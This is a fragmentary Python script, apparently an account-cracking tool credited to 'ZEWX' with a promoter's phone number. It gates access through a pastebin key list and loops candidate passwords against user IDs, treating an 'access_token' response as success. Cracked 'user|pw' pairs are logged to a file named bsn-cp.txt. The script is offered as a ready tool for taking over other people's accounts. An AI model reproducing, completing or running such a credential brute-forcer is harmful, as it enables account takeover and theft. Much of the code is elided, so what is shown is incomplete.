...
def logo():
	print("""%s
~~~~d88P Y88b         /                    
    d88P   Y88b       /   e88~~8e  Y88b  /  
   d88P     Y88b  e  /   d888  88b  Y88b/   
  d88P       Y88bd8b/    8888__888   Y88b   
 d88P         Y88Y8Y     Y888    ,   /Y88b  
d88P____       Y  Y       "88___/   /  Y88b      
"""%(O))
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://pastebin.com/pNzkg6Za.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( ZWEX )");time.sleep (0.03)
    print(" [*]. Tysm To My All Frendz. (NAZIR KHAN)");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  1.0                                    ");time.sleep (0.03)   
    print(" [*]. WP             +923025669420       ");time.sleep (0.03)
    print(" [*]. This Tool was made in Pakistan                 ");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] A N O N Y M O U S  D A R K F A T E  ( ZEWX )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [ZEWX] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    pass
                print('\r%s \033[1;91m[CP-ZEWX] %s | %s ' % (K,user,pw))
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                break
